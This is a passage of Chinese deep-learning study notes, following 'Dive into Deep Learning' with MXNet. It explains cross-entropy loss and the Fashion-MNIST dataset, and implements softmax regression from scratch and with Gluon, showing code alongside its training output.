&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/1f0333f50f9bd5cb188165b1e1c38d3f.svg#card=math&amp;amp;code=H%5Cleft%28%5Cboldsymbol%20y%5E%7B%28i%29%7D%2C%20%5Cboldsymbol%20%7B%5Chat%20y%7D%5E%7B%28i%29%7D%5Cright%20%29%20%3D%20-%5Csum_%7Bj%3D1%7D%5Eq%20y_j%5E%7B%28i%29%7D%20%5Clog%20%5Chat%20y_j%5E%7B%28i%29%7D&amp;amp;height=53&amp;amp;width=236&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中带下标的&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/e04c3b6bb7e3dfe0adca4d632a879725.svg#card=math&amp;amp;code=y_j%5E%7B%28i%29%7D&amp;amp;height=29&amp;amp;width=23&quot; alt=&quot;&quot;/&gt;是向量&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/64b526e162db89fbcfa5814825081f0d.svg#card=math&amp;amp;code=%5Cboldsymbol%20y%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=25&quot; alt=&quot;&quot;/&gt;中非0即1的元素，需要注意将它与样本&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;类别的离散数值，即不带下标的&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/4be66ad2cf5c98540db20bd7df0c0413.svg#card=math&amp;amp;code=y%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=23&quot; alt=&quot;&quot;/&gt;区分。&lt;br/&gt;上式中我们知道向量&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/64b526e162db89fbcfa5814825081f0d.svg#card=math&amp;amp;code=%5Cboldsymbol%20y%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=25&quot; alt=&quot;&quot;/&gt;中只有第&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/4be66ad2cf5c98540db20bd7df0c0413.svg#card=math&amp;amp;code=y%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=23&quot; alt=&quot;&quot;/&gt;个元素&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/80f55bb9c67a2e5b6d4916b8546113ae.svg#card=math&amp;amp;code=y%5E%7B%28i%29%7D_%7By%5E%7B%28i%29%7D%7D&amp;amp;height=32&amp;amp;width=28&quot; alt=&quot;&quot;/&gt;为1，其余全为0，于是&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/88a8163fcee1653cb0ef82ecaa1bafa7.svg#card=math&amp;amp;code=H%28%5Cboldsymbol%20y%5E%7B%28i%29%7D%2C%20%5Cboldsymbol%20%7B%5Chat%20y%7D%5E%7B%28i%29%7D%29%20%3D%20-%5Clog%20%5Chat%20y_%7By%5E%7B%28i%29%7D%7D%5E%7B%28i%29%7D&amp;amp;height=32&amp;amp;width=181&quot; alt=&quot;&quot;/&gt;。也就是说，交叉熵只关心对正确类别的预测概率，因为只要其值足够大，就可以确保分类结果正确。然而，当一个样本具有多个标签时，例如图像中不止一个物体时，并不能做这一步简化。但即便对于这种情况，交叉熵同样只关心对图像中出现的物体类别的预测概率。&lt;/p&gt;
&lt;p&gt;假设训练数据集的样本数为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7b8b965ad4bca0e41ab51de7b31363a1.svg#card=math&amp;amp;code=n&amp;amp;height=13&amp;amp;width=11&quot; alt=&quot;&quot;/&gt;，&lt;strong&gt;交叉熵损失函数&lt;/strong&gt;定义为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/613e9a12e92d939eccf74b90eb234846.svg#card=math&amp;amp;code=%5Cell%28%5Cboldsymbol%7B%5CTheta%7D%29%20%3D%20%5Cfrac%7B1%7D%7Bn%7D%20%5Csum_%7Bi%3D1%7D%5En%20H%5Cleft%28%5Cboldsymbol%20y%5E%7B%28i%29%7D%2C%20%5Cboldsymbol%20%7B%5Chat%20y%7D%5E%7B%28i%29%7D%5Cright%20%29&amp;amp;height=50&amp;amp;width=202&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/c29b59667470882e0b5d0a4ee9caf0dd.svg#card=math&amp;amp;code=%5Cboldsymbol%7B%5CTheta%7D&amp;amp;height=16&amp;amp;width=15&quot; alt=&quot;&quot;/&gt;代表模型参数。同样地，如果每个样本只有一个标签，那么交叉熵损失可以简写成&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/fd63e93067dbbf3bc7c95db60022b583.svg#card=math&amp;amp;code=%5Cell%28%5Cboldsymbol%7B%5CTheta%7D%29%20%3D%20-%281%2Fn%29%20%20%5Csum_%7Bi%3D1%7D%5En%20%5Clog%20%5Chat%20y_%7By%5E%7B%28i%29%7D%7D%5E%7B%28i%29%7D&amp;amp;height=50&amp;amp;width=196&quot; alt=&quot;&quot;/&gt;。另一个角度看，最小化&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/eb7289fc0254b92418f30b511b552d9c.svg#card=math&amp;amp;code=%5Cell%28%5Cboldsymbol%7B%5CTheta%7D%29&amp;amp;height=21&amp;amp;width=36&quot; alt=&quot;&quot;/&gt;等价于最大化&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/533504098fa35fd814a1309879a56541.svg#card=math&amp;amp;code=%5Cexp%28-n%5Cell%28%5Cboldsymbol%7B%5CTheta%7D%29%29%3D%5Cprod_%7Bi%3D1%7D%5En%20%5Chat%20y_%7By%5E%7B%28i%29%7D%7D%5E%7B%28i%29%7D&amp;amp;height=50&amp;amp;width=175&quot; alt=&quot;&quot;/&gt;，即最小化交叉熵损失函数等价于最大化训练数据集所有标签类别的联合预测概率。&lt;br/&gt;家乐：这里除以&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7b8b965ad4bca0e41ab51de7b31363a1.svg#card=math&amp;amp;code=n&amp;amp;height=13&amp;amp;width=11&quot; alt=&quot;&quot;/&gt;是因为需要衡量整个模型的质量，如果是小批量过程中，是除以&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/0aaab59ec4b011ac24a3fc5608b049de.svg#card=math&amp;amp;code=%5Ctext%7Bbatch_size%7D&amp;amp;height=16&amp;amp;width=77&quot; alt=&quot;&quot;/&gt;，自己概念绕混了，已更新在前一篇的损失函数章节上。&lt;/p&gt;
&lt;p&gt;练习一：最小化交叉熵损失函数与最大似然估计（MLE）：最大似然估计的目的是利用已知的样本结果，反推最有可能（最大概率）导致这样结果的参数值，两者同样可以用来调整模型参数值，不过MLE假设的前提是训练样本的分布能够代表样本的真实分布，每个样本集中的样本都是所谓独立同分布的随机变量 （iid条件），且有充分的训练样本，其将概率密度的估计转化为参数估计问题。&lt;/p&gt;
&lt;h3 id=&quot;模型预测及评价&quot;&gt;模型预测及评价&lt;/h3&gt;
&lt;p&gt;在训练好softmax回归模型后，给定一样本特征，就可以预测每个输出类别的概率，通常使用&lt;strong&gt;准确率&lt;/strong&gt;（accuracy）来评价模型的表现，其为正确预测数量与总预测数量之比。&lt;/p&gt;
&lt;h2 id=&quot;图像分类数据集（fashion-mnist）&quot;&gt;图像分类数据集（Fashion-MNIST）&lt;/h2&gt;
&lt;p&gt;Fashion-MNIST，顾名思义，时尚的MNIST，那MNIST是什么呢？MNIST数据集来自美国国家标准与技术研究所，由来自 250 个不同人手写的数字构成，全都是压缩过的手写数字图片，由于已经被玩烂了（大部分模型都可以做到95%以上的准确率），所以新的入门数据集被推了出来，即Fashion-MNIST。&lt;/p&gt;
&lt;p&gt;Fashion-MNIST一共包括十个类别，分别为't-shirt', 'trouser', 'pullover', 'dress', 'coat', 'sandal', 'shirt', 'sneaker', 'bag', 'ankle boot'，即T恤、裤子、套衫、连衣裙、外套、凉鞋、衬衫、运动鞋、包和短靴，由于存储空间原因，标签仅记录了数值标签0-9。&lt;/p&gt;
&lt;h3 id=&quot;获取数据集&quot;&gt;获取数据集&lt;/h3&gt;
&lt;h4 id=&quot;必要的包&quot;&gt;必要的包&lt;/h4&gt;
&lt;p&gt;其中d2lzh是“Dive into deep learning”书作者沐神写的，可以直接用pip安装，以后不表。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;from mxnet.gluon import data as gdata
import d2lzh as d2l
import time
import sys
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;训练与测试数据集&quot;&gt;训练与测试数据集&lt;/h4&gt;
&lt;p&gt;现在的框架基本上都带了常见数据集的一键下载，方便管理与组织。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;mnist_train = gdata.vision.FashionMNIST(train=True)
mnist_test = gdata.vision.FashionMNIST(train=False)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;练习三、四：gluon.data.vision里面还包括了常见的MNIST、CIFAT10、CIFAR100和自定义ImageRecordDataSet、ImageFolderDataSet（遍历文件夹的图片）等；transforms里还提供了各种随机化实例，用于扩充训练集。&lt;/p&gt;
&lt;h4 id=&quot;训练数据集样本数&quot;&gt;训练数据集样本数&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;len(mnist_train), len(mnist_test)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以查看训练集与测试集所含样本数，每个类别分别为6000和1000种。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(60000, 10000)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;查看样本&quot;&gt;查看样本&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;feature, label = mnist_train[0]
print(feature.shape, feature.dtype)
print(label, type(label), label.dtype)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;特征为宽高均为28像素的图像，每个像素的值为0到255之间8位无符号整数（uint8），使用三维NDArray存储。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(28, 28, 1) &amp;lt;class 'numpy.uint8'&amp;gt;
2 &amp;lt;class 'numpy.int32'&amp;gt; int32
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;获取标签&quot;&gt;获取标签&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def get_fashion_mnist_labels(labels):
    text_labels = ['t-shirt', 'trouser', 'pullover', 'dress', 'coat',
                   'sandal', 'shirt', 'sneaker', 'bag', 'ankle boot']
    return [text_labels[int(i)] for i in labels]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;画出图像&quot;&gt;画出图像&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def show_fashion_mnist(images, labels):
    d2l.use_svg_display()
    _, figs = d2l.plt.subplots(1, len(images), figsize=(12, 12))
    for f, img, lbl in zip(figs, images, labels):
        f.imshow(img.reshape((28, 28)).asnumpy())
        f.set_title(lbl)
        f.axes.get_xaxis().set_visible(False)
        f.axes.get_yaxis().set_visible(False)
 
X, y = mnist_train[:9]
show_fashion_mnist(X, get_fashion_mnist_labels(y))
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/svg/737845/1585552490284-b2f2014a-afef-4428-9cd7-f4f484cbaa15.svg#align=left&amp;amp;display=inline&amp;amp;height=105&amp;amp;name=output_6_0.svg&amp;amp;originHeight=104&amp;amp;originWidth=746&amp;amp;size=50593&amp;amp;status=done&amp;amp;style=none&amp;amp;width=752&quot; alt=&quot;output_6_0.svg&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;读取小批量&quot;&gt;读取小批量&lt;/h4&gt;
&lt;p&gt;虽然可以使用模仿上节线性回归，使用yield来做生成器，但为了代码简洁，直接创建了DataLoader实例。&lt;br/&gt;书后练习一：减小batch_size（如到1）会影响读取性能吗？答：会严重影响性能，4线程时，读取速度达到了惊人的152.24秒！&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;batch_size = 256
transformer = gdata.vision.transforms.ToTensor()
if sys.platform.startswith('win'):
    num_workers = 0
else:
    num_workers = 80

train_iter = gdata.DataLoader(mnist_train.transform_first(transformer),
                             batch_size=batch_size, shuffle=True,
                             num_workers=num_workers)
test_iter = gdata.DataLoader(mnist_test.transform_first(transformer),
                            batch_size=batch_size, shuffle=False,
                            num_workers=num_workers)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的num_worker是激活多线程来实现加速数据读取（暂不支持win），因为数据读取经常是训练的性能瓶颈，特别是当模型较简单或计算硬件性能较高时。另，使用ToTensor实例将图像数据从uint8格式转换为32位浮点数格式，并除以255使得所有像素的数值均在0到1之间，这一步叫作归一化；其还将图像通道从最后一维移到最前一维来方便之后介绍的卷积神经网络计算。通过transform_first函数，使ToTensor变换应用在每个数据样本（图像和标签）的第一个元素，即图像之上。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;start = time.time()
for X, y in train_iter:
    continue
'%.2f sec' % (time.time() - start)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;练习二：测试一下批量读取的时间，这里因为使用了40核的服务器，线程调到了80个，可以看到速度的明显提升，对比4线程时为1.72秒，40线程时为0.86秒。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;'0.74 sec'
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;全部代码&quot;&gt;全部代码&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/attachments/yuque/0/2020/html/737845/1585552169204-38e8f962-ab47-4c96-911e-86014a6bb079.html?_lake_card=%7B%22uid%22%3A%221585552167026-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fhtml%2F737845%2F1585552169204-38e8f962-ab47-4c96-911e-86014a6bb079.html%22%2C%22name%22%3A%22%E5%9B%BE%E5%83%8F%E5%88%86%E7%B1%BB%E6%95%B0%E6%8D%AE%E9%9B%86%EF%BC%88Fashion-MNIST%EF%BC%89.html%22%2C%22size%22%3A334900%2C%22type%22%3A%22text%2Fhtml%22%2C%22ext%22%3A%22html%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22YOeCR%22%2C%22card%22%3A%22file%22%7D&quot;&gt;图像分类数据集（Fashion-MNIST）.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;softmax回归的从零实现&quot;&gt;softmax回归的从零实现&lt;/h2&gt;
&lt;p&gt;绝大多数深度学习模型的训练都有着类似的步骤：获取并读取数据、定义模型和损失函数并使用优化算法训练模型。&lt;/p&gt;
&lt;h3 id=&quot;必要的包-2&quot;&gt;必要的包&lt;/h3&gt;
&lt;p&gt;前文已有基础，不多做介绍。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;from mxnet import autograd, gpu, nd
import d2lzh as d2l
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;改一下使用的gpu。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;ctx = gpu(3)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;读取数据集&quot;&gt;读取数据集&lt;/h3&gt;
&lt;p&gt;这里批大小设置为512，其实这个数据集本身就挺小的，感觉完全可以直接全扔显存。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;batch_size = 512
train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;初始化模型参数&quot;&gt;初始化模型参数&lt;/h3&gt;
&lt;p&gt;把每个样本拉长为一行长向量（28*28即784），作为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/02129bb861061d1a052c592e2dc6b383.svg#card=math&amp;amp;code=X&amp;amp;height=16&amp;amp;width=15&quot; alt=&quot;&quot;/&gt;参与运算即可。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;num_inputs = 28 * 28
num_outputs = 10

W = nd.random.normal(scale=0.01, shape=(num_inputs, num_outputs), ctx=ctx)
b = nd.zeros(num_outputs, ctx=ctx)

W.attach_grad()
b.attach_grad()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;实现softmax运算&quot;&gt;实现softmax运算&lt;/h3&gt;
&lt;p&gt;前面介绍过数学公式定义，这里利用NDArray实现上述操作。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;X = nd.array([[1, 2, 3], [3, 4, 5]], ctx=ctx)
print(X.sum(axis=0, keepdims=True), X.sum(axis=1, keepdims=True))
print(X.sum(axis=0), X.sum(axis=1, keepdims=False))
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，如果不加保留维度选项，输出会变回一维向量。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[[4. 6. 8.]]
&amp;lt;NDArray 1x3 @gpu(3)&amp;gt; 
[[ 6.]
 [12.]]
&amp;lt;NDArray 2x1 @gpu(3)&amp;gt;

[4. 6. 8.]
&amp;lt;NDArray 3 @gpu(3)&amp;gt; 
[ 6. 12.]
&amp;lt;NDArray 2 @gpu(3)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将预测值转化为一个合法的概率分布。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def softmax(X):
    X_exp = X.exp()
    partition = X_exp.sum(axis=1, keepdims=True)
    return X_exp / partition
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试一下这个函数：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;softmax(X)
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[[0.09003057 0.24472848 0.66524094]
 [0.09003057 0.24472846 0.66524094]]
&amp;lt;NDArray 2x3 @gpu(3)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;另外，这个只利用数学定义实现的softmax存在问题：因为指数函数非线性增大，如计算exp(50)，结果值就会变得非常大，难以维护数值稳定性。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;a = nd.array([50], ctx=ctx)
a.exp()
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[5.1847055e+21]
&amp;lt;NDArray 1 @gpu(3)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对一个随机的输入，验证一下softmax运算会将其变为非负数，且每行和为1。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;X = nd.random.normal(shape=(2, 5), ctx=ctx)
X_prob = softmax(X)
print(X)
print(X_prob, X_prob.sum(axis=1))
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[[-1.1795309   1.7976178   1.52335    -1.3275213  -0.21527036]
 [ 0.35299432  1.0368916  -1.1053166   0.08840044 -1.0292935 ]]
&amp;lt;NDArray 2x5 @gpu(3)&amp;gt;

[[0.02561495 0.5028665  0.38224316 0.02209134 0.0671841 ]
 [0.23625386 0.46815717 0.05495946 0.18132897 0.05930058]]
&amp;lt;NDArray 2x5 @gpu(3)&amp;gt; 
[1. 1.]
&amp;lt;NDArray 2 @gpu(3)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;定义模型&quot;&gt;定义模型&lt;/h3&gt;
&lt;p&gt;在这一步把图形数据拉长为长向量。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def net(X):
    return softmax(nd.dot(X.reshape((-1, num_inputs)).as_in_context(ctx), W) + b)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;定义损失函数&quot;&gt;定义损失函数&lt;/h3&gt;
&lt;p&gt;首先介绍一下nd.pick()方法，会按照索引从一个数组中挑出元素。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;y_hat = nd.array([[0.1, 0.3, 0.6], [0.3, 0.2, 0.5]])
y = nd.array([0, 2], dtype='int32')
nd.pick(y_hat, y)
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[0.1 0.5]
&amp;lt;NDArray 2 @cpu(0)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;按照数学定义的交叉熵损失函数即为预测值与真实值之差的负对数，这样损失函数对模型的惩罚非线性增大，但对数函数定义域为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/441973e35294179b77468901118c7a84.svg#card=math&amp;amp;code=%280%2C%20%2B%5Cinfty%29&amp;amp;height=21&amp;amp;width=60&quot; alt=&quot;&quot;/&gt;，这里输入参数的值域为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/4dabab2d922d2e80fc4d8be85a41ff51.svg#card=math&amp;amp;code=%280%2C%201%29&amp;amp;height=21&amp;amp;width=38&quot; alt=&quot;&quot;/&gt;（不取闭的原因是一般情况下不会出现，除非刚开始初始化时网络权重全0），所以输出值域就会变得很不稳定，如假设我们对于正确类别的预测值太低，会导致极大的loss。&lt;/p&gt;
&lt;p&gt;下面（简洁实现）会介绍一种同时包括softmax与交叉熵的函数，其具有更好的数值稳定性。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def cross_entropy(y_hat, y):
    return -nd.pick(y_hat, y).log()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里演示了有可能遇到的极限情况时，两者的差值。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;a = nd.array([0.000001, 0.999999], ctx=ctx)
print(a[1] / a[0])
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[999999.]
&amp;lt;NDArray 1 @gpu(3)&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;计算分类准确率&quot;&gt;计算分类准确率&lt;/h3&gt;
&lt;p&gt;给定一个预测概率分布&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7c7c2ffe888b7af16ee9544696a892f8.svg#card=math&amp;amp;code=y%5C_hat&amp;amp;height=18&amp;amp;width=41&quot; alt=&quot;&quot;/&gt;，将预测概率最大的类别作为输出类别。分类准确率即正确预测数量与总预测数量之比。由于标签为整数，需要将其转化为32位浮点数再进行比较。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def accuracy(y_hat, y):
    return (y_hat.argmax(axis=1) == y.astype('float32')).mean().asscalar()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试一下上面定义的变量的准确性，可以看出来，每行代表一个样本，每列代表一个样本的预测概率分布。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;accuracy(y_hat, y)
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;0.5
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同理，可以对整个模型计算分类准确率。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def evaluate_accuracy(data_iter, net):
    acc_sum, n = 0.0, 0
    for X, y in data_iter:
        y = y.astype('float32').as_in_context(ctx)
        acc_sum += (net(X).argmax(axis=1) == y).sum().asscalar()
        n += y.size
    return acc_sum / n
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于模型权重为随机初始化，所以现在对理论准确率为10%。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;evaluate_accuracy(test_iter, net)
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;0.0608
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;训练模型&quot;&gt;训练模型&lt;/h3&gt;
&lt;p&gt;这里超参数的设置可以自己随便调调观察效果。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;num_epochs, lr = 5, 0.2

def train(net, train_iter, test_iter, loss, num_epochs,
          batch_size, params=None, lr=None, trainer=None):
    for epoch in range(num_epochs):
        train_l_sum, train_acc_sum, n = 0.0, 0.0, 0
        for X, y in train_iter:
            with autograd.record():
                y_hat = net(X)
                l = loss(y_hat, y.as_in_context(ctx)).sum()
            l.backward()
            if trainer is None:
                d2l.sgd(params, lr, batch_size)
            else:
                traniner.step(batch_size)
            y = y.astype('float32')
            train_l_sum += l.asscalar()
            train_acc_sum += (y_hat.argmax(axis=1) == y.as_in_context(ctx)).sum().asscalar()
            n += y.size
        test_acc = evaluate_accuracy(test_iter, net)
        print('epoch %d, loss %.4f, train acc %.3f, test acc %.3f'
              % (epoch + 1, train_l_sum / n, train_acc_sum / n, test_acc))

train(net, train_iter, test_iter, cross_entropy, num_epochs, batch_size, [W, b], lr)
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;epoch 1, loss 0.9251, train acc 0.703, test acc 0.778
epoch 2, loss 0.6221, train acc 0.789, test acc 0.805
epoch 3, loss 0.5600, train acc 0.810, test acc 0.825
epoch 4, loss 0.5325, train acc 0.819, test acc 0.826
epoch 5, loss 0.5085, train acc 0.827, test acc 0.821
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;预测效果&quot;&gt;预测效果&lt;/h3&gt;
&lt;p&gt;这里演示一下如何对图像进行分类，可以看出五次迭代即达到了80%的准确度。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;count = 0
for X, y in test_iter:
    if count == 233:
        break
    count += 1

true_labels = d2l.get_fashion_mnist_labels(y.asnumpy())
pred_labels = d2l.get_fashion_mnist_labels(net(X).argmax(axis=1).asnumpy())
titles = [true + '\n' + pred for true, pred in zip(true_labels, pred_labels)]

d2l.show_fashion_mnist(X[:10], titles[:10])
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/svg/737845/1585580372760-4073b3d2-6f83-4d9a-8b93-93785988273a.svg#align=left&amp;amp;display=inline&amp;amp;height=113&amp;amp;name=output_18_0.svg&amp;amp;originHeight=112&amp;amp;originWidth=746&amp;amp;size=57624&amp;amp;status=done&amp;amp;style=none&amp;amp;width=752&quot; alt=&quot;output_18_0.svg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;全部代码-2&quot;&gt;全部代码&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/attachments/yuque/0/2020/html/737845/1585580587515-d2bfbd6d-6413-42aa-8057-c91e8dc9f764.html?_lake_card=%7B%22uid%22%3A%221585580585983-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fhtml%2F737845%2F1585580587515-d2bfbd6d-6413-42aa-8057-c91e8dc9f764.html%22%2C%22name%22%3A%22softmax%E5%9B%9E%E5%BD%92%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0.html%22%2C%22size%22%3A358218%2C%22type%22%3A%22text%2Fhtml%22%2C%22ext%22%3A%22html%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22erJw8%22%2C%22card%22%3A%22file%22%7D&quot;&gt;softmax回归从零实现.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;softmax简洁实现&quot;&gt;softmax简洁实现&lt;/h2&gt;
&lt;p&gt;同样适用gluon自带的库。&lt;/p&gt;
&lt;h3 id=&quot;必要的包-3&quot;&gt;必要的包&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;from mxnet.gluon import loss as gloss, nn
from mxnet import autograd, gluon, init, gpu
import d2lzh as d2l
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;切换下gpu。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;ctx = gpu(3)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;读取数据集-2&quot;&gt;读取数据集&lt;/h3&gt;
&lt;p&gt;同上。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;batch_size = 512
train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;定义和初始化模型&quot;&gt;定义和初始化模型&lt;/h3&gt;
&lt;p&gt;同上篇文章。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;net = nn.Sequential()
net.add(nn.Dense(10))
net.initialize(init.Normal(sigma=0.01), ctx=ctx)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;softmax和交叉熵损失函数&quot;&gt;softmax和交叉熵损失函数&lt;/h3&gt;
&lt;p&gt;使用gluon提供的混合包，可以获得更好的数值稳定性，参见上面的损失函数部分遇到的问题。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;loss = gloss.SoftmaxCrossEntropyLoss()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;训练模型-2&quot;&gt;训练模型&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;trainer = gluon.Trainer(net.collect_params(), 'sgd', {'learning_rate': 0.2})
&lt;/code&gt;
&lt;/pre&gt;
